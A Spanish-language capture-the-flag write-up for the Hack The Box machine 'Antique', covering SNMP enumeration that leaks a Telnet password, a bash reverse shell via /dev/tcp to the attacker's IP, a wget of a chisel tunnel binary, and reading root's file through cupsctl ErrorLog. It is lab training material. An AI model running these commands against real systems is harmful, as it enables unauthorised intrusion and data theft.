___
# Writeup: Antique (HTB)

Solo detectamos expuesto el puerto 23 (Telnet). Procedemos a realizar un escaneo específico con scripts básicos y detección de versiones:

```bash
nmap -sCV -p23 10.129.65.15 -oN targeted
```

Nos conectamos mediante Telnet para interactuar directamente con el servicio:

```bash
telnet 10.129.65.15 23
```

Podemos ver que se trata de un servidor HP JetDirect y solicita una contraseña de administración que no tenemos.

Al no encontrar más vectores viables en TCP, realizamos un escaneo sobre los puertos UDP más comunes:

```bash
nmap -sU --top-ports 100 --open -T5 -v -n 10.129.65.15
```

![antique_udpscan](imgs%201/antique_udpscan.png)

Identificamos el puerto 161/UDP abierto, correspondiente al servicio SNMP.

### Enumeración SNMP

Validamos si la cadena de comunidad (_community string_) por defecto es válida (`public`) o realizamos fuerza bruta utilizando la herramienta `onesixtyone`:

```bash
onesixtyone 10.129.65.15 -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt
```

Confirmamos que es `public`, ahora consultamos el árbol SNMP con `snmpwalk`:

```bash
snmpwalk -c public -v2c 10.129.65.15
```

![antique_snmpwalk](imgs%201/antique_snmpwalk.png)

Para obtener una salida más legible y descriptiva en lugar de los identificadores numéricos (`iso.3.6.1.2.1`), configuramos los MIBs:

1. Instalamos el paquete: `apt install snmp-mibs-downloader`
2. Editamos `/etc/snmp/snmp.conf` y comentamos la línea `mibs :`.

Ejecutamos la consulta desde la raíz del árbol OID (`1`) para recuperar toda la información disponible:

```bash
snmpwalk -c public 10.129.65.15 1
```

![antique_snmp](imgs%201/antique_snmp.png)

En la salida descubrimos una cadena codificada en hexadecimal. La decodificamos a texto plano.

```bash
echo "<cadena_hex>" | xargs | xxd -ps -r
```

Obtenemos la contraseña del servicio:

```plaintext
P@ssw0rd@123!!123q"2Rbs3CSs$4EuWGW(8i
```

![antique_telnetpass](imgs%201/antique_telnetpass.png)

## 2. Acceso Inicial

Nos autenticamos en el servicio Telnet con la contraseña obtenida. Al ingresar el comando de ayuda (`?`), vemos que el entorno dispone del comando `exec`, permitiendo la ejecución de comandos.

![antique_flaguser_exec](imgs%201/antique_flaguser_exec.png)

Aprovechamos `exec` para establecer una Reverse Shell:

1. Ponemos un puerto en escucha en nuestra máquina:

```bash
nc -nlvp 443
```

2. Enviamos la reverse shell desde la consola Telnet:

```bash
exec bash -c "bash -i >& /dev/tcp/10.10.17.184/443 0>&1"
```

![shell_antique 1](imgs%201/shell_antique%201.png)

Una vez obtenida la shell, realizamos el tratamiento completo de la TTY para trabajar cómodos.

```bash
script /dev/null -c bash
# Presionamos Ctrl + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
stty rows 44 columns 184
```

## 3. Escalada de Privilegios

Iniciamos la enumeración local del sistema verificando permisos SUID, capabilities y conexiones internas:

```bash
# Binarios SUID
find / -perm -4000 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Conexiones y puertos locales
netstat -nat
```

Detectamos el puerto local 631/TCP (CUPS - Common Unix Printing System), inaccesible desde el exterior.

### Port Forwarding con Chisel

Para interactuar con el panel web de CUPS desde nuestro navegador, creamos un túnel utilizando Chisel.

1. En la máquina atacante (servidor):

```bash
# Compilamos
go build -ldflags "-s -w" .
upx chisel

# Iniciar servidor
./chisel server --reverse -p 1234
```

2. Transferimos el binario compilado a la máquina víctima mediante un servidor temporal en Python (`python3 -m http.server 80`) y lo ejecutamos como cliente:

```bash
wget http://10.10.17.184/chisel
chmod +x chisel
./chisel client 10.10.17.184:1234 R:631:127.0.0.1:631
```

### Explotación de CUPS (Lectura Arbitraria de Archivos)

Con el túnel activo, accedemos a la interfaz de CUPS localmente. Mediante la utilidad `cupsctl`, podemos cambiar el `ErrorLog` del servicio para que apunte a otros archivos que puedan pertenecen[...]

```bash
cupsctl ErrorLog=/root/root.txt
```

Mandamos un curl a la ruta del error_log

```bash
curl -s -k -X GET "https://localhost:631/admin/error_log"
```

![antique_errorlog](imgs%201/antique_errorlog.png)
La respuesta muestra el contenido de la flag de root.

_(Método alternativo: Debido a la versión del kernel presente en la máquina, el sistema también resulta vulnerable a Dirty Pipe [CVE-2022-0847], permitiendo sobreescribir archivos de solo lec[...]